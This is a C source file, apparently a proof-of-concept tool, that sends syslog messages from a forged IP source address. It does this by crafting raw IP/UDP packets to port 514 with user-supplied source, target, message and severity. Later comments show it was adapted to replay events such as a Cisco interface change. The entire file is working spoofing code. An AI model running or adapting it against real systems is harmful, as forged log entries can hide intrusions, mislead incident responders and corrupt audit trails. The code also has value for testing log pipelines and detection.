/* spoof_syslog.c
 *
 * This program sends a spoofed syslog message.  You have to be root to run it.
 * Source and target IP addresses, message text, facility and priority are
 * supplied by the user.
 *
 * The code compiles and works under Linux.  Any Unix that has
 * SOCK_RAW/IPPROTO_RAW should be no problem (you may need to use BSD-style
 * struct ip though).  It could use a few improvements, like checking for possible
 * ICMP Port Unreachable errors in case the remote machine doesn't run syslogd
 * with remote reception turned on.
 *
 * The idea behind this program is a proof of a concept, nothing more.  It
 * comes as is, no warranty.
 *
 * */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <syslog.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

#define IPVERSION       4

/* This is the stuff that actually gets sent.  Feel free to change it */
#define MESSAGE_FAC LOG_LOCAL7
// #define MESSAGE_PRI LOG_INFO
// char message[] = {"logreplay[4489]: connection from devil@hell.org.universe\n"};

struct raw_pkt_hdr {
   	struct iphdr ip; /* This is Linux-style iphdr.
					  	Use BSD-style struct ip if you want */
   	struct udphdr udp;
};

struct raw_pkt_hdr* pkt;

void die(char *);
unsigned long int get_ip_addr(char*);
unsigned short checksum(unsigned short*,char);

/* Added by Ethan */
#define NUM_CMD_ARGS 5		/* Take 5 args from command line */
/* I'm guessing about these paramters.  Rename them to make more sense. */
char *log_message;
int  priority;

/* End Added by Ethan */

int main(int argc,char** argv){

	struct sockaddr_in sa;
   	int sock,packet_len;
   	char usage[] = {"\
Spoof a syslog message to appear from a specified source\n\
usage: spoof src_hostname dst_hostname \"message\" severity[integer]\n\
Example: ./spoof 1.1.1.1 127.0.0.1 \"Log_Replay[7306]: %LINK-3-UPDOWN: Interface FastEthernet1/0/19, changed state to up\" 3 \n"};

	char on = 1;

	if(argc != NUM_CMD_ARGS)
	   	die(usage);

   	log_message = argv[3];
	priority = atoi(argv[4]);

	/* EDB:  Remove this if you don't want the run-time arg info printed out: */
 printf("Running using args:\n\tIP1: %s\n\tIP2: %s\n\tMessage: %s\n\tSeverity: %i\n", argv[1], argv[2], log_message, priority); 

	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
	   	perror("socket");
	   	exit(1);
   	}

	sa.sin_addr.s_addr = get_ip_addr(argv[2]);
   	sa.sin_family = AF_INET;

	packet_len = sizeof(struct raw_pkt_hdr)+strlen(log_message)+5;
   	pkt = calloc((size_t)1,(size_t)packet_len);

	pkt->ip.version = IPVERSION;
   	pkt->ip.ihl = sizeof(struct iphdr) >> 2;
   	pkt->ip.tos = 0;
   	pkt->ip.tot_len = htons(packet_len);
   	pkt->ip.id = htons(getpid() & 0xFFFF);
   	pkt->ip.frag_off = 0;
   	pkt->ip.ttl = 0x40;
   	pkt->ip.protocol = IPPROTO_UDP;
   	pkt->ip.check = 0;
   	pkt->ip.saddr = get_ip_addr(argv[1]);
   	pkt->ip.daddr = sa.sin_addr.s_addr;
   	pkt->ip.check = checksum((unsigned short*)pkt,sizeof(struct iphdr));

	pkt->udp.source = htons(514);
   	pkt->udp.dest = htons(514);
   	pkt->udp.len = htons(packet_len - sizeof(struct iphdr));
   	pkt->udp.check = 0;  /* If you feel like screwing around with pseudo-headers
						   	and stuff, you may of course calculate UDP checksum
						   	as well.  I chose to leave it zero, it's usually OK */

	sprintf((char*)pkt+sizeof(struct raw_pkt_hdr),"<%d>%s",
		   	(int)(MESSAGE_FAC | priority),log_message);

	if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
	   	perror("setsockopt: IP_HDRINCL");
	   	exit(1);
   	}

	if(sendto(sock,pkt,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0){
	   	perror("sendto");
	   	exit(1);
   	}
   	exit(0);
}

void die(char* str){
   	fprintf(stderr,"%s\n",str);
   	exit(1);
}

unsigned long int get_ip_addr(char* str){

	struct hostent *hostp;
   	unsigned long int addr;

	if( (addr = inet_addr(str)) == -1){
	   	if( (hostp = gethostbyname(str)))
		   	return *(unsigned long int*)(hostp->h_addr);
	   	else {
			 fprintf(stderr,"unknown host %s\n",str);
			 
	   	}
   	}
   	return addr;
}

unsigned short checksum(unsigned short* addr,char len){
   	/* This is a simplified version that expects even number of bytes */
   	register long sum = 0;

	while(len > 1){
	   	sum += *addr++;
	   	len -= 2;
   	}
   	while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);

	return ~sum;
}
